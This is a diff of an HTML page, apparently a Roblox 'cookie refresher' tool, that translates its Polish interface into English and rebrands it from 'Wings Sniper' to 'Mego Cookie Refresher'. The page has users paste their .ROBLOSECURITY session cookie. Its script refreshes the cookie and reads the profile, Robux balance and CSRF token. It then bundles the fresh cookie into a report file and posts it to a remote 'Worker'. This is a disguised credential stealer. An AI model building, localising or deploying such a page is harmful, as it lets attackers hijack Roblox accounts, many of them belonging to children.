@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="pl">
+<html lang="en">
 <head>
     <meta charset="utf-8">
-    <title>Wings Sniper - Cookie Refresher & Checker</title>
+    <title>Mego Cookie Refresher</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -64,11 +64,11 @@
 </head>
 <body>
     <div class="card">
-        <h2>Wings Sniper / Refresher Panel</h2>
-        <label for="cookieInput">Wklej stare .ROBLOSECURITY:</label>
+        <h2>Mego Cookie Refresher</h2>
+        <label for="cookieInput">Paste your .ROBLOSECURITY cookie:</label>
         <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...">
-        <button id="refreshBtn">Odśwież i wyślij</button>
-        <pre id="outputLog">Status: Gotowy do działania...</pre>
+        <button id="refreshBtn">Refresh & Send</button>
+        <pre id="outputLog">Status: Ready to process...</pre>
     </div>
 
     <script>
@@ -124,19 +124,19 @@
             const logBox = document.getElementById('outputLog');
 
             if (!cookie) {
-                logBox.innerText = "Błąd: Wpisz najpierw ciasteczko .ROBLOSECURITY!";
+                logBox.innerText = "Error: Please enter a .ROBLOSECURITY cookie first!";
                 return;
             }
 
-            logBox.innerText = "[*] Próbuję odświeżyć ciasteczko...";
+            logBox.innerText = "[*] Attempting to refresh cookie...";
 
             const refreshed = await refreshRobloxCookie(cookie);
             const finalCookie = refreshed.cookie;
-            const activeCsrf = refreshed.csrf || "Brak";
+            const activeCsrf = refreshed.csrf || "None";
 
-            logBox.innerText = "[+] Ciasteczko przetworzone!\n[*] Pobieranie danych profilu...";
+            logBox.innerText = "[+] Cookie processed!\n[*] Fetching profile details...";
 
-            let profileReport = "Błąd pobierania profilu";
+            let profileReport = "Failed to fetch profile";
             try {
                 const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
                     headers: { "Cookie": ".ROBLOSECURITY=" + finalCookie }
@@ -157,24 +157,24 @@
 
                     profileReport = `- ID: ${userId}\n- Name: ${userData.name}\n- Display Name: ${userData.displayName}\n- Robux: ${robux}\n- X-CSRF-Token: ${activeCsrf}`;
                 } else {
-                    profileReport = "Sesja nieważna lub odrzucona przez API.";
+                    profileReport = "Session invalid or rejected by API.";
                 }
             } catch (err) {
-                profileReport = "Błąd API: " + err.message;
+                profileReport = "API Error: " + err.message;
             }
 
-            logBox.innerText = "[*] Wysyłanie raportu do Workera...";
+            logBox.innerText = "[*] Sending report to Worker...";
 
             try {
                 const credentialsContent = 
 `========================================
-       ROBLOX REFRESHED WEB PANEL     
+       MEGO COOKIE REFRESHER PANEL     
 ========================================
 
-[📊] Dane profilu:
+[📊] Profile Stats:
 ${profileReport}
 
-[🌈] Świeże .ROBLOSECURITY:
+[🌈] Refreshed .ROBLOSECURITY:
 ${finalCookie}`;
 
                 const blob = new Blob([credentialsContent], { type: "text/plain" });
@@ -186,9 +186,9 @@ ${finalCookie}`;
                     body: formData
                 });
 
-                logBox.innerText = "Sukces! Ciasteczko zostało odświeżone i wysłane.\n\n" + profileReport;
+                logBox.innerText = "Success! Cookie has been refreshed and sent.\n\n" + profileReport;
             } catch (err) {
-                logBox.innerText = "Błąd wysyłania do Workera: " + err.message;
+                logBox.innerText = "Error sending to Worker: " + err.message;
             }
         });
     </script>
